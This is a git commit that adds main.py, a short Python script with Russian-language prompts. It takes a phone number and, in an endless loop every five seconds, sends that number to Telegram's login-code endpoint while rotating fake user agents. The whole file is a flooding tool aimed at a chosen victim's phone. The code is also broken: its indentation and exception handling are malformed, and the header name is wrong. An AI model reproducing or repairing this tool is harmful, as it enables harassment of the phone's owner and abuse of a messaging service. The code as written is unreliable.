a00d5ca786bd9aeeacecb549215599ebd6e80567
nanotez <97647355+nanotez@users.noreply.github.com>
2022-01-14 13:37:45 +0200

    Create main.py

---
+++ main.py
@@ -0,0 +1,17 @@
+import requests, fake_useragent, time
+
+ user = fake_useragent.UserAgent().random
+ headers = {'user_agent': user}
+NUMBER = input('Ведите номер')
+
+while True:
+ user = fake_useragent.UserAgent().random
+ headers = {'user_agent': user}
+   try:
+      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : NUMBER})
+      print('Отправлен')
+      except:
+        print('Не отправлен')
+        
+       time.sleep(5)
+      
